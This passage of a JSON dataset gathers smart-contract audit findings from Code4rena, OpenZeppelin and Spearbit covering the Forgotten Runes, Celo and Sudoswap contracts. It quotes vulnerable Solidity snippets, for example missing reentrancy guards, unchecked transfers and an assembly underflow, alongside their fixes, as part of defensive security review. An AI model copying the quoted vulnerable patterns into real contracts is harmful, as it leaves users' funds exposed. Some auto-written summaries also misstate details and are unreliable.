benefit the owner since the price lowers with time and everyone pays the final lower price. If the auction does well at the beginning the owner could stop the auction to stop the price from being lower. This works against the integrity of the dutch auction.\n\nAlso changing the Start Price or the Lowest price in the middle of the auction could allow the owner to manipulate the price.\n\n### Recommended Mitigation Steps\n\nTo each of these setter functions add require (variable == 0) to ensure they are set once in a permanent way. Also, the Lowest price < startPrice should be required.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/38#issuecomment-1159524932):**\n > While centralization risk is acknowledged by the team, I agree that these variable should not be able to be changed during sale since it may lead to loss of functionality. Consolidating all similar issue for different variables here. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the ForgottenRunesWarriorsMinter contract. It describes how the owner could manipulate the price of the Dutch Auction by changing variables such as the start price, lowest price, daPriceCurveLength, and daDropInterval. This would benefit the owner since the price lowers with time and everyone pays the final lower price.\n\nThe recommended mitigation steps for this vulnerability are to add a require statement to each of the setter functions that ensures the variable is set to 0 once in a permanent way. Additionally, the Lowest price should be required to be less than the Start Price. This will ensure the integrity of the Dutch Auction and prevent the owner from manipulating the price.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "https://github.com/code-423n4/2022-05-runes-findings/issues/38",
      "tags": [
        "Validation"
      ],
      "finders": [
        "IllIllI",
        "BowTiedWardens",
        "leastwood",
        "gzeon",
        "WatchPug",
        "pedroais",
        "AuditsAreUS",
        "GimelSec",
        "defsec"
      ]
    },
    {
      "id": "2193",
      "title": "[M-02] Contract may not have enough fund to cover refund",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon, also found by AuditsAreUS, BowTiedWardens, pedroais, Ruhum, shenwilly, and teddav_\n\nOwner of the contract can call `withdrawAll` before the refund process is done to send all ETH to the vault. Since there are no payable receive function in `ForgottenRunesWarriorsMinter`, the owner won't be able to replenish the contract for the refund process.\n\n### Proof of Concept\n\n[ForgottenRunesWarriorsMinter.sol#L616-L619](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L616-L619)<br>\n\n```solidity\n    function withdrawAll() public payable onlyOwner {\n        require(address(vault) != address(0), 'no vault');\n        require(payable(vault).send(address(this).balance));\n    }\n```\n\n### Recommended Mitigation Steps\n\nOnly allow owner to call `withdrawAll` after refund period.\n\n**[cryppadotta (Forgotten Runes) confirmed and commented](https://github.com/code-423n4/2022-05-runes-findings/issues/187#issuecomment-1119768097):**\n > This is a great point. It would be annoying to accidentally do this and have to make a new contract for refunds.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/187#issuecomment-1159518087):**\n > Sponsor confirmed, submitted by contest judge.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the ForgottenRunesWarriorsMinter contract code, which allows the owner of the contract to call the 'withdrawAll' function before the refund process is complete, sending all ETH to the vault. This could cause problems as there is no payable receive function in the contract, meaning the owner would not be able to replenish the contract for the refund process. \n\nThe proof of concept for this bug is provided in the code snippet from the contract, which can be found at the link provided in the report. \n\nThe recommended mitigation steps are to only allow the owner to call the 'withdrawAll' function after the refund period. This will ensure that the contract has sufficient funds to complete the refund process.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "https://github.com/code-423n4/2022-05-runes-findings/issues/187",
      "tags": [],
      "finders": [
        "BowTiedWardens",
        "Ruhum",
        "gzeon",
        "teddav",
        "shenwilly",
        "pedroais",
        "AuditsAreUS"
      ]
    },
    {
      "id": "2192",
      "title": "[M-01] IERC20.transfer does not support all ERC20 token",
      "impact": "MEDIUM",
      "content": "_Submitted by VAD37, also found by AuditsAreUS, IllIllI, MaratCerby, rfa, and sorrynotsorry_\n\n[ForgottenRunesWarriorsGuild.sol#L173-L176](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L173-L176)<br>\n[ForgottenRunesWarriorsMinter.sol#L627-L630](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L627-L630)<br>\n\nToken like [USDT](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#contracts) known for using non-standard ERC20. ([Missing return boolean on transfer](https://forum.openzeppelin.com/t/can-not-call-the-function-approve-of-the-usdt-contract/2130/4)).\n\nContract function [forwardERC20](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L173-L176) will always revert when try to transfer this kind of tokens.\n\n### Impact\n\nCannot withdraw some special ERC20 token through contract call. Unexpected contract functionality = Medium severity\n\n### Recommended Mitigation Steps\n\nUse [SafeTransferLib.safeTransfer](https://github.com/Rari-Capital/solmate/blob/4197b521ef3eb81f675d35e64b7b597b24d33500/src/utils/SafeTransferLib.sol#L65-L94) instead of IERC20 transfer. This accepts ERC20 token with no boolean return like USDT.\n\n**[cryppadotta (Forgotten Runes) confirmed and commented](https://github.com/code-423n4/2022-05-runes-findings/issues/70#issuecomment-1118097813):**\n > Ah nice. You learn something new every day. Thanks!\n\n**[KenzoAgada (warden) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/70#issuecomment-1147126705):**\n > Description is pretty much invalid as \"[forwardERC20](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L173-L176) will always revert when try to transfer this kind of tokens\" is simply not true. Same with impact - \"Cannot withdraw some special ERC20 token through contract call\" - that's not the impact, using SafeERC20's transfer will not help to transfer tokens. It will just revert on failure.\n> But generally the issue of not using SafeERC20 is kinda-correct. Duplicate of [#2](https://github.com/code-423n4/2022-05-runes-findings/issues/2).\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/70#issuecomment-1159516016):**\n > This is not a duplicate of [#2](https://github.com/code-423n4/2022-05-runes-findings/issues/2). #2 describes the silent failure of ERC20 transfer, while this describes a ERC20 that return void instead of bool. The call will revert even if the transfer is successful because Solidity expected a return value. Judging as Med Risk because unlike #2, here you can actually do something to fix the function.\n\n**[KenzoAgada (warden) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/70#issuecomment-1159630893):**\n > I apologize, my mistake.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a contract called ForgottenRunesWarriorsGuild.sol. This vulnerability affects the ability to withdraw some special ERC20 tokens, such as USDT, through a contract call. The severity of this unexpected contract functionality is classified as medium.\n\nThe code of the contract can be found at the following two links:\nhttps://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L173-L176\nhttps://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L627-L630\n\nThe cause of the vulnerability is the missing return boolean on the transfer of USDT, which can be found on the link provided in the report.\n\nTo fix the vulnerability, the code of the contract should be changed to use SafeTransferLib.safeTransfer instead of IERC20 transfer. This is a function that accepts ERC20 tokens without a boolean return, such as USDT.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "https://github.com/code-423n4/2022-05-runes-findings/issues/70",
      "tags": [],
      "finders": [
        "VAD37",
        "IllIllI",
        "rfa",
        "MaratCerby",
        "sorrynotsorry",
        "AuditsAreUS"
      ]
    },
    {
      "id": "10656",
      "title": "[L04] Contract registry has no entry for BRL",
      "impact": "LOW",
      "content": "In [PR #8831](https://github.com/celo-org/celo-monorepo/pull/8831), the [`UsingRegistryV2` contract](https://github.com/celo-org/celo-monorepo/blob/63f75e33df2fe8f1a9005fce53de302d126fe2c3/packages/protocol/contracts/common/UsingRegistryV2.sol) provides various getters returning addresses for contracts comprising the Celo protocol. For each featured protocol contract, a constant pointer is defined and used to inform the corresponding getter. While this mechanism isn’t too complex, duplicating this process in code for a particular contract can lead to errors.\n\n\nThe problem is that the EUR token [has corresponding getters](https://github.com/celo-org/celo-monorepo/blob/63f75e33df2fe8f1a9005fce53de302d126fe2c3/packages/protocol/contracts/common/UsingRegistryV2.sol#L86) for its registry and exchange, while the BRL token does not. So retrieval of corresponding BRL contract address would require code that may be error prone and not follow the standard defined by the `UsingRegistryV2` contract.\n\n\nConsider defining within the `UsingRegistryV2` contract getters corresponding to the BRL token.\n\n\n**Update:** *Fixed as of commit [`0afc15a6dac109ada329e12c0d40fec7dcb9f40c`](https://github.com/luisgj/celo-monorepo/commit/0afc15a6dac109ada329e12c0d40fec7dcb9f40c). cLab’s statement for this issue:*\n\n\n\n> *“we were indeed missing the getters, but the contract UsingRegistryV2 is not actually used anywhere and the contract to update should have been UsingRegistry.”*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 6",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-release-6/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10655",
      "title": "[L03] Validators does not increment PATCH version",
      "impact": "LOW",
      "content": "In [PR #8349](https://github.com/celo-org/celo-monorepo/pull/8349/files#diff-e1c177d3b579272bfa171be200069cbb9961d2072fd5b16d843f5427bd155274), the `getVersionNumber` function is removed [from `AddressLinkedList.sol`](https://github.com/celo-org/celo-monorepo/pull/8349/files#diff-e1c177d3b579272bfa171be200069cbb9961d2072fd5b16d843f5427bd155274).\n\n\n`Validators.sol` does [not increment the PATCH version](https://github.com/celo-org/celo-monorepo/blob/5ce409a35f5abdf90ed3985dca09eba8df6f565e/packages/protocol/contracts/governance/Validators.sol#L165-L167) even though it is [using `AddressLinkedList.sol`](https://github.com/celo-org/celo-monorepo/blob/5ce409a35f5abdf90ed3985dca09eba8df6f565e/packages/protocol/contracts/governance/Validators.sol#L13). Consider incrementing the PATCH version of the Validators contract to reflect the change.\n\n\n**Update:** *Fixed in PR8475 as of commit [`4bd0dea1a9a24282c107527175442de879230ced`](https://github.com/celo-org/celo-monorepo/pull/8475/commits/4bd0dea1a9a24282c107527175442de879230ced).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 6",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-release-6/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10654",
      "title": "[L02] genericTransfer can fail without error",
      "impact": "LOW",
      "content": "In [PR #8750](https://github.com/celo-org/celo-monorepo/pull/8750), the [`genericTransfer` function](https://github.com/celo-org/celo-monorepo/blob/e04bd2af60ed20fad991115d22214b95597ea6be/packages/protocol/contracts/governance/ReleaseGold.sol#L186) of the `ReleaseGold` contract calls the ERC20 member `transfer` function on the `erc20` token, but does not check the returned `bool` of the `transfer`.\n\n\nThis means that with certain ERC20 tokens, the `transfer` could fail and the user would receive no error messages with information on the failing conditions.\n\n\nConsider updating the token `transfer` to instead use OpenZeppelin’s [`SafeERC20` `safeTransfer` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8d7a871609117b2d95074f5f5e92e4c0506584b7/contracts/token/ERC20/utils/SafeERC20.sol#L20), which will provide proper logging in the event of a transfer failure.\n\n\n**Update:** *Fixed in PR9025 at commit [`6e5a9b26b3d4b34f7370f465ea8ee4fc28183cc3`](https://github.com/celo-org/celo-monorepo/pull/9025/commits/6e5a9b26b3d4b34f7370f465ea8ee4fc28183cc3).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 6",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-release-6/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10653",
      "title": "[L01] Missing error message in require statement",
      "impact": "LOW",
      "content": "[PR #8360](https://github.com/celo-org/celo-monorepo/pull/8360) contains a require statement [in `removeStorageRoot`](https://github.com/celo-org/celo-monorepo/blob/c1f72b8918d8d6f1da2d988afd410bbd0ebad96a/packages/protocol/contracts/common/Accounts.sol#L266) that does not include an error message. Consider including specific and informative error messages in all require statements.\n\n\n**Update:** *Fixed in PR9010 at commit [`093ac05c3b66b8381ae85bfd4eef6b9eacb1c536`](https://github.com/celo-org/celo-monorepo/pull/9010/commits/093ac05c3b66b8381ae85bfd4eef6b9eacb1c536).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 6",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-release-6/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "6790",
      "title": "Add Reentrancy Guards",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context: All LSSVM Contracts\n\nSpecifically, three categories of functions:\n\n1. Functions withdrawing ETH\n2. Functions sending ETH\n3. Functions that use `safeTransferFrom()` to call external addresses.\n\n### Instances of Functions Withdrawing ETH:\n- `LSSVMPairFactory.sol#L272`\n- `LSSVMPairETH.sol#L104`\n\n### Instances of Functions Sending ETH:\n- `LSSVMPairETH.sol#L34`\n- `LSSVMPairETH.sol#L46`\n- `LSSVMPairETH.sol#L79`\n- `LSSVMRouter.sol#L376`\n- `LSSVMRouter.sol#L423`\n- `LSSVMRouter.sol#L640`\n- `LSSVMRouter.sol#L677`\n\n### Uses of `safeTransferFrom()` to External Addresses:\n- `LSSVMRouter.sol#L544`\n- `LSSVMRouter.sol#L593`\n- `LSSVMPairFactory.sol#L773`\n- `LSSVMPairEnumerable.sol#L33`\n- `LSSVMPairEnumerable.sol#L52`\n- `LSSVMPairEnumerable.sol#L73`\n- `LSSVMPairEnumerable.sol#L114`\n- `LSSVMPairMissingEnumerable.sol#L37`\n- `LSSVMPairMissingEnumerable.sol#L58`\n- `LSSVMPairMissingEnumerable.sol#L82`\n- `LSSVMPairMissingEnumerable.sol#L133`\n- `LSSVMPairMissingEnumerable.sol#L143`\n\n## Description\nThe abovementioned permalinks and corresponding functions are listed for Sudoswap’s consideration to introduce reentrancy guard modifiers. Currently, there is only one function that uses a reentrancy guard modifier: `withdrawAllETH()` in `LSSVMPairETH.sol#L94`.\n\nOther functions in the codebase may also require reentrancy guard modifiers. We have only seen reentrancy problems when malicious routers, asset recipients, curves, factory owner, or protocol fee recipient are involved. Despite normal prohibitions on this occurrence, it is better to protect one’s codebase than regret leaving open vulnerabilities available for potential attackers. \n\nThere are three categories of functions that Sudoswap should consider applying reentrancy guard modifiers to: functions withdrawing ETH, functions sending ETH, and uses of `safeTransferFrom()` to external addresses (which will trigger an `onERC1155Received()` callback to receiving contracts).\n\n### Examples of Functions Withdrawing ETH within LSSVM:\n- `LSSVMPairFactory.sol#L272`\n- `LSSVMPairETH.sol#L104`\n\n### Instances of Functions Sending ETH within LSSVM:\n- `LSSVMPairETH.sol#L34`\n- `LSSVMPairETH.sol#L46`\n\n### Instances That Use `safeTransferFrom()` to Call External Addresses:\nA couple of instances that use `safeTransferFrom()` to call external addresses, which will trigger an `onERC1155Received()` callback to receiving contracts:\n- `LSSVMPairFactory.sol#L428`\n- `LSSVMRouter.sol#L544`\n\n## Recommendation\nSpearbit recommends Sudoswap to consider adding reentrancy guards to the abovementioned functions and to the entire codebase where appropriate.\n\n## Sudoswap's Response\nWe’ve addressed the specific issues linked above with regards to reentrancy. The checks in `_pairTransferERC20From` and `_takeNFTsFromSender` both verify token balance or ownership before and after each transfer, which can help ensure that tokens are actually sent to the Pair (or its asset recipient). \n\nHowever, we acknowledge this does not mitigate the entire space of possible issues with future malicious routers. The gas overhead for adding Reentrancy-Guard can be quite significant when, for example, swapping across multiple pools in one transaction, so we have opted to avoid it if possible. Pair owners will need to be aware of which new routers become approved by the factory owner (intended to be set to governance-controlled timelock during deployment).\n\n## Spearbit's Acknowledgment\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6789",
      "title": "Avoid utilizing inside knowledge of functions",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- LSSVMRouter.sol\n- LSSVMPair.sol\n- LSSVMPairETH.sol\n\n## Description\nETH-based swap functions use `isRouter == false` and `routerCaller == address(0)` as parameters to `swapTokenForAnyNFTs()` and `swapTokenForSpecificNFTs()`. These parameters end up in `_validateTokenInput()`. The LSSVMPairETH version of this function does not use those parameters, so it is not a problem at this point. \n\nHowever, the call actually originates from the Router, so functionally `isRouter` should be true. \n\nOur concern is that using inside knowledge of the functions might potentially introduce subtle issues in the following scenarios:\n\n```solidity\nfunction robustSwapETHForAnyNFTs(...) {\n    ...\n    remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0));\n    ...\n}\n```\n\n```solidity\nfunction robustSwapETHForSpecificNFTs(...) {\n    ...\n    remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, false, address(0));\n    ...\n}\n```\n\n```solidity\nfunction _swapETHForAnyNFTs(...) {\n    ...\n    remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0));\n    ...\n}\n```\n\n```solidity\nfunction _swapETHForSpecificNFTs(...) {\n    ...\n    remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, false, address(0));\n    ...\n}\n```\n\n```solidity\nfunction swapTokenForAnyNFTs(..., bool isRouter, address routerCaller) {\n    ...\n    _validateTokenInput(inputAmount, isRouter, routerCaller, _factory);\n    ...\n}\n```\n\n```solidity\nfunction swapTokenForSpecificNFTs(..., bool isRouter, address routerCaller) {\n    ...\n    _validateTokenInput(inputAmount, isRouter, routerCaller, _factory);\n    ...\n}\n```\n\nAbstract contract LSSVMPairETH extends LSSVMPair:\n\n```solidity\nabstract contract LSSVMPairETH is LSSVMPair {\n    function _validateTokenInput(..., bool, /*isRouter*/ address, /*routerCaller*/ ...) {\n        // doesn't use isRouter and routerCaller\n    }\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to consider making the changes listed below in the following functions:\n- `_swapETHForSpecificNFTs`\n- `robustSwapETHForAnyNFTs`\n- `robustSwapETHForSpecificNFTs`\n- `_swapETHForAnyNFTs`\n\nChanges to be made:\n\n```solidity\n- remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, false, address(0));\n+ remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, true, msg.sender);\n```\n\n```solidity\n- remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0));\n+ remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, true, msg.sender);\n```\n\n## Acknowledgments\n- **Sudoswap**: Addressed in this branch here.\n- **Spearbit**: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6788",
      "title": "Check number of NFTs is not 0",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `LSSVMPair.sol#L258-310`\n- `LSSVMPair.sol#L318-366`\n- `LSSVMPair.sol#L413-431`\n\n## Description\nFunctions `swapNFTsForToken()`, `routerSwapNFTsForToken()`, and `getSellNFTQuote()` in `LSSVMPair.sol` do not perform input verification on the number of NFTs. If `_bondingCurve.getSellInfo()` accidentally happens to return a non-zero value, then an unfair amount of tokens will be given back to the caller.\n\nThe current two versions of `bondingCurve` do return 0, but a future version might accidentally return non-zero.\n\n**Note:**\n1. `getSellInfo()` is supposed to return an error when `numNFTs == 0`, but this does not always happen. This error code is not always checked.\n\n```solidity\nfunction swapNFTsForToken(uint256[] calldata nftIds, ...) external virtual returns (uint256 outputAmount) {\n    ...\n    // No check on nftIds.length\n    (error, newSpotPrice, outputAmount, protocolFee) = _bondingCurve.getSellInfo(..., nftIds.length, ..);\n    ...\n}\n```\n\n```solidity\nfunction routerSwapNFTsForToken(address payable tokenRecipient) {\n    ...\n    uint256 numNFTs = _nft.balanceOf(getAssetRecipient()) - _assetRecipientNFTBalanceAtTransferStart;\n    ...\n    // No check that numNFTs > 0\n    (error, newSpotPrice, outputAmount, protocolFee) = _bondingCurve.getSellInfo(..., numNFTs, ...);\n    ...\n}\n```\n\n```solidity\nfunction getSellNFTQuote(uint256 numNFTs) {\n    ...\n    // No check that numNFTs > 0\n    (error, newSpotPrice, outputAmount, protocolFee) = bondingCurve().getSellInfo(..., numNFTs, ...);\n    ...\n}\n```\n\n2. For comparison, the function `swapTokenForSpecificNFTs()` does perform an entry check on the number of requested NFTs.\n\n```solidity\nfunction swapTokenForSpecificNFTs(uint256[] calldata nftIds, ...) {\n    ...\n    // There is a check on the number of requested NFTs\n    require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))), \"Must ask for > 0 and < balanceOf NFTs\");\n    // check is present\n    ...\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to implement checks and make sure the number of NFTs is greater than 0.\n\nSudoswap: Added check to the `swapNFTForTokens` function here.\n\nSpearbit: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6787",
      "title": "Potentially undetected underﬂow In assembly",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n**Context:**  \nLSSVMPair.sol#L447-494, LSSVMPairERC20.sol#L24-32\n\n**Description:**  \nFunctions `factory()`, `bondingCurve()`, `nft()`, `poolType()`, and `token()` have an assembly-based calculation where the `paramsLength` is subtracted from `calldatasize()`. Assembly underflow checks are disregarded and if too few parameters are supplied in calls to the functions in the LSSVMPair contract, this calculation may underflow, resulting in the values for `factory()`, `bondingCurve()`, `nft()`, `poolType()`, and `token()` to be read from unexpected pieces of memory. This will usually be zeroed; therefore, execution will stop at some point. However, it is safer to prevent this from ever happening.\n\n```solidity\nfunction factory() public pure returns (LSSVMPairFactoryLike _factory) {\n    ...\n    assembly {_factory := shr(0x60, calldataload(sub(calldatasize(), paramsLength)))} ,!\n}\n\nfunction bondingCurve() public pure returns (ICurve _bondingCurve) {\n    ...\n    assembly {_bondingCurve := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), 20)))} ,!\n}\n\nfunction nft() public pure returns (IERC721 _nft) {\n    ...\n    assembly {_nft := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), 40)))} ,!\n}\n\nfunction poolType() public pure returns (PoolType _poolType) {\n    ...\n    assembly {_poolType := shr(0xf8, calldataload(add(sub(calldatasize(), paramsLength), 60)))} ,!\n}\n\nfunction token() public pure returns (ERC20 _token) {\n    ...\n    assembly {_token := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), 61)))} ,!\n}\n```\n\n**Recommendation:**  \nSpearbit recommends Sudoswap to implement the following changes for all functions so that an underflow will be detected at the Solidity level.\n\n```solidity\n+ uint256 offset = msg.data.length - paramsLength;\n- assembly {_token := shr(... ,calldataload(add(sub(calldatasize(), paramsLength), ...)))} ,!\n+ assembly {_token := shr(... ,calldataload(add(offset, ...)))}\n```\n\n**Sudoswap:**  \nAcknowledged, but no change for now, as we only use this pattern for the purpose of reading variables meant to be immutable, so all values are hard-coded, which makes the possibility of underflow unlikely.\n\n**Spearbit:**  \nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6786",
      "title": "Check for 0parameters",
      "impact": "LOW",
      "content": "## Security Review Report\n\n## Severity\n**Low Risk**\n\n## Context\nLSSVMPairFactory.sol#L291-356\n\n## Description\nFunctions `setCallAllowed()` and `setBondingCurveAllowed()` do not check that `target != 0` while the comparable function `setRouterAllowed()` does check for `_router != 0`.\n\n```solidity\nfunction setCallAllowed(address payable target, bool isAllowed) external\nonlyOwner { \n    // No check on target\n    callAllowed[target] = isAllowed;\n}\n\nfunction setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external\nonlyOwner { \n    // No check on bondingCurve\n    bondingCurveAllowed[bondingCurve] = isAllowed;\n}\n\nfunction setRouterAllowed(LSSVMRouter _router, bool isAllowed) external\nonlyOwner { \n    require(address(_router) != address(0), \"0 router address\");\n    routerAllowed[_router] = isAllowed;\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to consider adding a check for zero parameters in `setCallAllowed()` and `setBondingCurveAllowed()`. If zero checks are considered to be unnecessary because these functions are protected by `onlyOwner`, then the zero check could be removed from `setRouterAllowed()`.\n\n## Additional Notes\n**Sudoswap**: Removed zero address check in `setRouterAllowed` for consistency here.  \n**Spearbit**: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6785",
      "title": "Only transfer relevant funds for PoolType",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nLSSVMPairFactory.sol#L363-416\n\n## Description\nThe functions `_initializePairETH()` and `_initializePairERC20()` allow for the transfer of ETH/ERC20 and NFTs even when this is not relevant for the PoolType. Although funds can be rescued from the Pair, it is perhaps better to prevent these types of mistakes.\n\n### Function: _initializePairETH\n```solidity\nfunction _initializePairETH(...) { \n    ...\n    // Transfer initial ETH to pair \n    // Only relevant for PoolType.TOKEN or PoolType.TRADE \n    payable(address(_pair)).safeTransferETH(msg.value); \n    ... \n    // Transfer initial NFTs from sender to pair \n    for (uint256 i = 0; i < _initialNFTIDs.length; i++) { \n        // Only relevant for PoolType.NFT or PoolType.TRADE \n        _nft.safeTransferFrom(msg.sender, address(_pair), _initialNFTIDs[i]); \n    } \n} \n```\n\n### Function: _initializePairERC20\n```solidity\nfunction _initializePairERC20(...) { \n    ...\n    // Transfer initial tokens to pair \n    // Only relevant for PoolType.TOKEN or PoolType.TRADE \n    _token.safeTransferFrom(msg.sender, address(_pair), _initialTokenBalance); \n    ... \n    // Transfer initial NFTs from sender to pair \n    for (uint256 i = 0; i < _initialNFTIDs.length; i++) { \n        // Only relevant for PoolType.NFT or PoolType.TRADE \n        _nft.safeTransferFrom(msg.sender, address(_pair), _initialNFTIDs[i]); \n    } \n} \n```\n\n## Recommendation\nSpearbit recommends Sudoswap to only transfer the ETH/ERC20/NFTs that are relevant for the Pair PoolType.\n\n## Sudoswap\nAcknowledged, but no change for now. Clients will be responsible for ensuring users deposit the correct assets, and the existence of rescue functions makes it possible to correct.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6784",
      "title": "Disallow arbitrary function calls to LSSVMPairETH",
      "impact": "LOW",
